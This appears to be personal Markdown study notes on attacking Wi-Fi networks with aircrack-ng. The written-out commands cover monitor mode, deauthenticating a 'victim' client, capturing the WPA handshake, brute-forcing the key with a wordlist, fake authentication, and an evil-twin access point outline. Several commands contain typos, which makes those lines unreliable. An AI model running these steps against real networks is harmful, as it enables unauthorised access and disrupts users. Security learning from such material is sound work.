- [aircrack-ng tools](#aircrack-ng-tools)
  - [steps](#steps)
      - [getting packages](#getting-packages)
    - [weak IV traffic](#weak-iv-traffic)
  - [evil twin](#evil-twin)



## aircrack-ng tools
- airmon-ng = monitor interface
  - airmon-ng start wlan0 = start monitoring
    - stop connections
- airmon-ng check = processes that may interfere with aircrack-ng
  - airmon-ng check kill = kill all processes (no internet)
  - Restore: 
    - airmon-ng stop connection (mode)
    - sudo service NetworkManager restart || sudo service network-manager restart || sudo service wpa_supplicant restart || sudo service dhclient restart
### steps
1 - kill process that can conflict = airmon-ng check kill
2 - turn network card to monitor mode = airmon-ng start [network_name]
3 - find AP around and capture traffic (also 4 handshake) = airodump [my_listener] --bsid [my_mac] --channel --write output
4 - deauthenticate an user to force 4 handshae =  aireplay-ng --deauth 0 -a [my_mac] -c [victim] [network_name]
5 - crack PSK - brute force = aircrak-ng -w [wordlist] -b [my_mac] [file.cap]

##### getting packages
- airomon-ng start wlan0 = promiscuous mode interface to sniff wireles package (same channel)
- airodump-ng network (wlan0monl) = sniff packages
- airodump-ng wlan0mon --bssid [123] --channel [123] --write OUTPUT
- 
#### weak IV traffic
- 
- fake authentication
  - aireplay-ng --fakeauth 0 -a MAC wlan0mon -h MAC-host
  - aireplay-ng --deauth 0 -e "name" wlan0mon
  - 
### evil twin
- create fale access point (ap)
- deauthenticate client
- force clien to connect to fake ap